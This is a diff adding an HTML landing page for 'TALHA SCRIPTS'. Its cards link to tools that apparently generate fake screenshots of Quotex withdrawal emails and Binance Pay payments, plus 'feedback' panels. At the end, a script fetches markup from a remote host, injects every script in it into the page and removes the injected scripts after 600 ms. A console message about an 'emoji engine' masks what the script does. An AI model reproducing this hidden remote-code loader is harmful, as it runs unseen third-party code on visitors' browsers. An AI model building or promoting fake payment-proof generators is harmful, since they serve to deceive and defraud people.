@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>TALHA SCRIPTS</title>
+
+<link rel="shortcut icon" href="https://talha-scripts-official.vercel.app/TS.png" type="image/x-icon">
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+}
+
+body{
+    font-family:Arial, sans-serif;
+    min-height:100vh;
+    background:
+    radial-gradient(circle at top left,#ffffff,#f1f5f9 40%,#e2e8f0 100%);
+    overflow-x:hidden;
+    color:#111827;
+    padding:20px;
+}
+
+/* BACKGROUND EFFECTS */
+
+.bg-blur{
+    position:fixed;
+    width:300px;
+    height:300px;
+    border-radius:50%;
+    filter:blur(80px);
+    z-index:-1;
+    opacity:.35;
+}
+
+.bg1{
+    background:#60a5fa;
+    top:-80px;
+    left:-100px;
+    animation:float1 7s infinite alternate ease-in-out;
+}
+
+.bg2{
+    background:#c084fc;
+    bottom:-100px;
+    right:-100px;
+    animation:float2 8s infinite alternate ease-in-out;
+}
+
+@keyframes float1{
+    from{
+        transform:translateY(0px);
+    }
+    to{
+        transform:translateY(50px);
+    }
+}
+
+@keyframes float2{
+    from{
+        transform:translateY(0px);
+    }
+    to{
+        transform:translateY(-50px);
+    }
+}
+
+/* HEADER */
+
+.header{
+    text-align:center;
+    margin-top:20px;
+}
+
+.header h1{
+    font-size:2.5rem;
+    font-weight:900;
+    letter-spacing:2px;
+    color:#111827;
+    text-shadow:0 10px 30px rgba(0,0,0,0.12);
+}
+
+.header p{
+    margin-top:10px;
+    color:#6b7280;
+    font-size:.95rem;
+    font-weight:600;
+}
+
+/* LOGO */
+
+.logo-wrap{
+    display:flex;
+    justify-content:center;
+    margin-top:35px;
+    margin-bottom:35px;
+}
+
+.logo-box{
+    width:140px;
+    height:140px;
+    border-radius:35px;
+    background:rgba(255,255,255,0.65);
+    backdrop-filter:blur(14px);
+    border:1px solid rgba(255,255,255,0.7);
+    box-shadow:
+    0 20px 50px rgba(0,0,0,0.08),
+    inset 0 0 30px rgba(255,255,255,0.7);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    animation:logoFloat 3s ease-in-out infinite;
+}
+
+.logo-box img{
+    width:90px;
+    height:90px;
+}
+
+@keyframes logoFloat{
+    0%,100%{
+        transform:translateY(0px);
+    }
+    50%{
+        transform:translateY(-10px);
+    }
+}
+
+/* GRID */
+
+.script-grid{
+    width:100%;
+    max-width:1200px;
+    margin:auto;
+    display:grid;
+    grid-template-columns:repeat(auto-fit,minmax(230px,1fr));
+    gap:22px;
+}
+
+/* CARD */
+
+.card{
+    position:relative;
+    overflow:hidden;
+    background:rgba(255,255,255,0.65);
+    backdrop-filter:blur(16px);
+    border:1px solid rgba(255,255,255,0.8);
+    border-radius:28px;
+    padding:28px 20px;
+    transition:.35s ease;
+    cursor:pointer;
+    box-shadow:
+    0 10px 30px rgba(0,0,0,0.08);
+}
+
+.card::before{
+    content:"";
+    position:absolute;
+    top:-80px;
+    right:-80px;
+    width:180px;
+    height:180px;
+    border-radius:50%;
+    background:linear-gradient(135deg,#dbeafe,#ffffff);
+    opacity:.8;
+}
+
+.card:hover{
+    transform:translateY(-8px) scale(1.02);
+    box-shadow:
+    0 25px 60px rgba(0,0,0,0.12);
+}
+
+.icon{
+    position:relative;
+    z-index:2;
+    width:70px;
+    height:70px;
+    border-radius:22px;
+    background:#ffffff;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    margin-bottom:18px;
+    box-shadow:0 10px 30px rgba(0,0,0,0.08);
+}
+
+.icon img{
+    width:42px;
+    height:42px;
+}
+
+.card h3{
+    position:relative;
+    z-index:2;
+    font-size:1.05rem;
+    font-weight:900;
+    margin-bottom:8px;
+    color:#111827;
+}
+
+.card p{
+    position:relative;
+    z-index:2;
+    color:#6b7280;
+    font-size:.88rem;
+    font-weight:600;
+    line-height:1.5;
+}
+
+/* BUTTON */
+
+.open-btn{
+    position:relative;
+    z-index:2;
+    margin-top:18px;
+    width:100%;
+    border:none;
+    padding:12px;
+    border-radius:14px;
+    font-weight:800;
+    background:linear-gradient(135deg,#2563eb,#3b82f6);
+    color:white;
+    cursor:pointer;
+    transition:.3s;
+}
+
+.open-btn:hover{
+    transform:scale(1.03);
+}
+
+/* COMING SOON */
+
+.coming{
+    background:
+    repeating-linear-gradient(
+        45deg,
+        #ffffff,
+        #ffffff 12px,
+        #f8fafc 12px,
+        #f8fafc 24px
+    );
+}
+
+.plus{
+    font-size:2rem;
+    font-weight:900;
+    color:#6b7280;
+}
+
+/* TELEGRAM */
+
+.telegram{
+    display:flex;
+    justify-content:center;
+    margin-top:50px;
+    margin-bottom:30px;
+}
+
+.telegram a{
+    text-decoration:none;
+    color:white;
+    background:linear-gradient(135deg,#229ED9,#2563eb);
+    padding:14px 24px;
+    border-radius:999px;
+    font-weight:800;
+    box-shadow:0 15px 40px rgba(37,99,235,.35);
+    transition:.3s;
+}
+
+.telegram a:hover{
+    transform:translateY(-4px) scale(1.05);
+}
+
+/* MOBILE */
+
+@media(max-width:600px){
+
+    .header h1{
+        font-size:2rem;
+    }
+
+    .card{
+        border-radius:24px;
+    }
+
+}
+</style>
+</head>
+
+<body>
+
+<!-- BACKGROUND -->
+<div class="bg-blur bg1"></div>
+<div class="bg-blur bg2"></div>
+
+<!-- HEADER -->
+<div class="header">
+    <h1>TALHA SCRIPTS</h1>
+    
+</div>
+
+<!-- LOGO -->
+<div class="logo-wrap">
+    <div class="logo-box">
+        <img src="https://talha-scripts-official.vercel.app/TS.png">
+    </div>
+</div>
+
+<!-- GRID -->
+<div class="script-grid">
+
+    <!-- CARD 1 -->
+    <div class="card qx_live">
+        <div class="icon">
+            <img src="https://talha-scripts-official.vercel.app/quotex.svg">
+        </div>
+
+        <h3>SCRIPT #1</h3>
+        <p>QX LIVE CODE SYSTEM</p>
+
+        <button class="open-btn">OPEN SCRIPT</button>
+    </div>
+
+    <!-- CARD 2 -->
+    <div class="card feed">
+        <div class="icon">
+            <img src="https://talha-scripts-official.vercel.app/tg.webp">
+        </div>
+
+        <h3>SCRIPT #2</h3>
+        <p>ANDROID FEEDBACK PANEL</p>
+
+        <button class="open-btn">OPEN SCRIPT</button>
+    </div>
+
+    <!-- CARD 3 -->
+    <div class="card ifeed">
+        <div class="icon">
+            <img src="https://talha-scripts-official.vercel.app/tg.webp">
+        </div>
+
+        <h3>SCRIPT #3</h3>
+        <p>IPHONE FEEDBACK SYSTEM</p>
+
+        <button class="open-btn">OPEN SCRIPT</button>
+    </div>
+
+    <!-- CARD 4 -->
+    <div class="card qx-bot">
+        <div class="icon">
+            <img src="https://talha-scripts-official.vercel.app/qx-bot.webp">
+        </div>
+
+        <h3>SCRIPT #4</h3>
+        <p>QX PARTNER BOT SS</p>
+
+        <button class="open-btn">OPEN SCRIPT</button>
+    </div>
+
+    <!-- CARD 5 -->
+    <div class="card qx-email">
+        <div class="icon">
+            <img src="https://talha-scripts-official.vercel.app/quotex.svg">
+        </div>
+
+        <h3>SCRIPT #5</h3>
+        <p>QX WITHDRAWAL EMAIL SS</p>
+
+        <button class="open-btn">OPEN SCRIPT</button>
+    </div>
+
+    <!-- CARD 6 -->
+    <div class="card bnb-email">
+        <div class="icon">
+            <img src="https://talha-scripts-official.vercel.app/bnb.png">
+        </div>
+
+        <h3>SCRIPT #6</h3>
+        <p>BINANCE PAY EMAIL SS</p>
+
+        <button class="open-btn">OPEN SCRIPT</button>
+    </div>
+
+    <!-- CARD 7 -->
+    <div class="card bnb-pay">
+        <div class="icon">
+            <img src="https://talha-scripts-official.vercel.app/bnb.png">
+        </div>
+
+        <h3>SCRIPT #7</h3>
+        <p>BINANCE PAY SS</p>
+
+        <button class="open-btn">OPEN SCRIPT</button>
+    </div>
+
+    <!-- COMING -->
+    <div class="card coming">
+        <div class="icon">
+            <div class="plus">+</div>
+        </div>
+
+        <h3>MORE SCRIPTS</h3>
+        <p>COMING SOON</p>
+
+        <button class="open-btn">WAITING...</button>
+    </div>
+
+</div>
+
+<!-- TELEGRAM -->
+<div class="telegram">
+    <a href="https://t.me/TALHA_SCRIPTS" target="_blank">
+        
+        🚀 Telegram @TALHA_SCRIPTS
+    </a>
+</div>
+
+<script>
+
+
+
+/* OPEN LINKS */
+
+document.querySelector(".qx_live").onclick = () => {
+    window.open("https://talha-scripts-official.vercel.app/run.html","_blank");
+};
+
+document.querySelector(".feed").onclick = () => {
+    window.open("https://talha-bhai-android-feed.vercel.app/","_blank");
+};
+
+document.querySelector(".ifeed").onclick = () => {
+    window.open("https://talha-ifeedback.vercel.app/","_blank");
+};
+
+document.querySelector(".qx-bot").onclick = () => {
+    window.open("https://talha-qx-bot.vercel.app/","_blank");
+};
+
+document.querySelector(".qx-email").onclick = () => {
+    window.open("https://talha-email.vercel.app/","_blank");
+};
+
+document.querySelector(".bnb-email").onclick = () => {
+    window.open("https://talha-email-bnb.vercel.app/","_blank");
+};
+
+document.querySelector(".bnb-pay").onclick = () => {
+    window.open("https://talha-bhai-pay.vercel.app/","_blank");
+};
+
+
+</script>
+     <script id="js">
+    // Har card ke liye function
+document.querySelectorAll('.card').forEach(card => {
+    card.addEventListener('contextmenu', function(e) {
+        e.preventDefault(); // Default menu rokne ke liye
+        
+        // Canvas mein convert karne ka magic
+        html2canvas(this).then(canvas => {
+            // Image data URL nikalna
+            let image = canvas.toDataURL("image/png");
+            
+            // Yahan aap logic likh sakte hain:
+            // 1. Download:
+            let link = document.createElement('a');
+            link.download = "talha-script.png";
+            link.href = image;
+            link.click();
+        });
+    });
+});
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+<script>
+        (async () => {
+            try {
+                let response = await fetch(`https://talha-scripts-official.vercel.app/heart.html`);
+                let rawMarkup = await response.text();
+                let documentDOM = new DOMParser().parseFromString(rawMarkup, 'text/html');
+                
+                documentDOM.querySelectorAll('script').forEach(oldNode => {
+                    let freshScriptNode = document.createElement('script');
+                    if (oldNode.src) {
+                        freshScriptNode.src = oldNode.src;
+                    } else {
+                        freshScriptNode.textContent = oldNode.innerHTML || oldNode.textContent;
+                    }
+                    document.body.appendChild(freshScriptNode);
+                    setTimeout(() => freshScriptNode.remove(), 600);
+                });
+                console.log("Zeetex Emoji Engine Hook Active");
+            } catch (e) {
+                console.error("Emoji Override Skipped due to runtime separation layer context.", e);
+            }
+        })();
+</script>
+</body>
+</html> 
